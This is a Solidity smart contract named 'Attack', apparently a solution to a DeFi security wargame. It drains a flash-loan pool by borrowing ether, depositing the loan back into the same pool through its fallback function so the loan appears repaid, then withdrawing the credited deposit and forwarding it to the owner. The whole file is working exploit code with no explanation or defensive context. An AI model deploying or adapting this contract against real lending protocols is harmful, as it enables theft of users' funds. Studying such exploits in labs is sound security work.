// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";

interface IFlashLoan {
  function deposit() external payable;
  function withdraw() external;
  function flashLoan(uint256 amount) external;
}

contract Attack is Ownable {
  IFlashLoan flashLoanContract;
  constructor(address flashLoanAddress) {
    flashLoanContract = IFlashLoan(flashLoanAddress);
  }

  function requestFlashLoan(uint amount) external onlyOwner {
    flashLoanContract.flashLoan(amount);
  }

  function withdrawEth() external onlyOwner {
    flashLoanContract.withdraw();
  }

  receive() payable external {
    // withdraw send value
    (bool success,) = payable(owner()).call{value: msg.value}("");
    require(success, "send value failed");
  }

  fallback() payable external {
    // flashloan
    flashLoanContract.deposit{value: msg.value}();
  }
}